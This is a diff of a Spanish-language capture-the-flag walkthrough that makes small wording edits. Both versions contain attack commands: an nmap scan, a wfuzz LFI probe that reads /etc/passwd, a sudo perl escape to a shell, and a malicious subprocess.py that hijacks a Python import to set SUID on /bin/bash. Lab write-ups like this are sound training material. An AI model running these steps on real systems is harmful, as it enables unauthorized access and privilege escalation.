@@ -7,7 +7,7 @@ ___
 
 Primero, **Escaneamos** el objetivo en busca de puertos, servicios y versiones usando `nmap`:  
 
- `nmap -n -v -sV -sC --min-rate 5000 <IP>`  
+ `nmap -n -v --open -sV -sC --min-rate 5000 <IP>`  
 
 [IMG]  
 
@@ -25,7 +25,7 @@ ___
 
 #### FASE EXPLOTACIÓN (Ganar Acceso):  
 
-Bien, probando y probando, encontramos que podemos intentar un LFI en dicho parámetro. Queda:  
+Bien, probando y probando, encontramos que podemos intentar un **LFI** en dicho parámetro. Queda:  
 
 `wfuzz -c --hc 404 -t 200 -z list,"../../../../../etc/passwd" -u "http://<IP>/index.php?secret=FUZZ"`  
 
@@ -46,7 +46,7 @@ ___
 
 Una de las primeras cosas que debemos hacer cuando ya tenemos un pie dentro es ver los **Privilegios Sudo** con `sudo -l`.  
 
-El resultado nos mustra que podemos usar `/usr/bin/perl` como `luisillo` para convertirnos en él. Vamos a la web https://gtfobins.github.io/ y terminamos corriendo `sudo -u luisillo /usr/bin/perl -e 'exec "/bin/bash";'` como `vaxei`.  
+El resultado nos mustra que podemos usar `/usr/bin/perl` sin contraseña como `luisillo` para convertirnos en él. Vamos a la web https://gtfobins.github.io/ y terminamos corriendo `sudo -u luisillo /usr/bin/perl -e 'exec "/bin/bash";'` como `vaxei`.  
 Enseguida `whoami` y verificamos que somos `luisillo`.  
 
 Chequeando los **Privilegios Sudo** con este usuario, lanzando `sudo -l`, vemos que tenemos sobre un script en particular usando Python3:  `/usr/bin/python3 /opt/paw.py`  
@@ -63,7 +63,7 @@ Con esto en mente, nos movemos a `/opt/` y creamos un `subprocess.py` malicioso 
 > os.system("chmod u+s /bin/bash");
 > ```  
 
-Le damos permisos de ejecutable con `chmod +x subprocess.py`. 
+Le damos permisos de ejecución con `chmod +x subprocess.py`. 
 
 Este `/opt/subprocess.py` malicioso le da permisos SUID a `/bin/bash` en caso de ser root y, como tenemos permisos sudo con `/usr/bin/python3 /opt/paw.py`, tendríamos éxito.  
 
